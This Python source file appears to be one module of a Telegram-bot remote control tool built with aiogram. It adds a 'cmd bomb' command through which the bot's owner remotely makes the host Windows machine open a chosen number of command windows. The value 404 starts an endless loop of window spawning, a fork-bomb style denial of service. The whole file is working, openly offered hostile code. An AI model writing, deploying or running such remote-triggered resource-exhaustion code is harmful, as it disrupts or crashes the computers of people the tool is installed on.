##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from config import ALLOWED_USER_ID
from lib.states import CMDBOOM
from lib.texts import TEXTS, user_languages

import subprocess

def register_cmd_bomb(dp):
    @dp.message(F.text.lower() == "cmd бомба")
    @dp.message(F.text.lower() == "cmd boom")
    @dp.message(Command("cmd_boom"))
    async def start_cmd_bomb(message: types.Message, state: FSMContext):
        user_id = message.from_user.id
        lang = user_languages.get(user_id, 'en')

        if user_id == ALLOWED_USER_ID:
            await message.answer(TEXTS[lang]['cmd_bomb_warning'])
            await state.set_state(CMDBOOM.waiting_CMD)
        else:
            await message.answer(TEXTS[lang]['access_denied'])

    @dp.message(CMDBOOM.waiting_CMD)
    async def process_cmd_bomb(message: types.Message, state: FSMContext):
        user_id = message.from_user.id
        lang = user_languages.get(user_id, 'en')

        if user_id != ALLOWED_USER_ID:
            await message.answer(TEXTS[lang]['access_denied'])
            return

        try:
            BOOM = int(message.text)

            if BOOM < 0:
                await message.answer(TEXTS[lang]['cmd_bomb_negative'])
                return
            elif BOOM == 404:
                while True:
                    subprocess.Popen('start cmd', shell=True)
            else:
                for _ in range(BOOM):
                    subprocess.Popen('start cmd', shell=True)
                await state.clear()

            await message.answer(TEXTS[lang]['cmd_bomb_opened'])

        except ValueError:
            await message.answer(TEXTS[lang]['cmd_bomb_invalid'])
        except Exception as e:
            await message.answer(TEXTS[lang]['error_occurred'].format(error=e))